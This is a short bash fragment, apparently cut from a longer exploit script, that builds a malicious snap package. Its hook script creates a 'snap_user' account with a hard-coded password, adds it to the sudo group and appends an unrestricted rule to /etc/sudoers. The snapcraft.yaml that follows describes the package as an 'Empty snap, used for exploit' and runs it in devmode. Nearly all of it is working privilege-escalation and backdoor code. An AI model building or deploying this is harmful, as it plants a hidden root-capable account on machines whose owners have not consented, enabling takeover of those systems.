#!/bin/bash
password="snap_user"
pass=$(perl -e 'print crypt($ARGV[0], "password")' $password)
useradd snap_user -m -p $pass -s /bin/bash
usermod -aG sudo snap_user
echo "snap_user ALL=(ALL:ALL) ALL" >> /etc/sudoers
EOF
# Configure the snap yaml file
cat > snap/snapcraft.yaml << "EOF"
name: snap-user
version: '0.1'
summary: Empty snap, used for exploit
description: |
 This is an example
grade: devel
confinement: devmode
parts:
 my-part:
 plugin: nil
EOF
# Build the snap
snapcraft
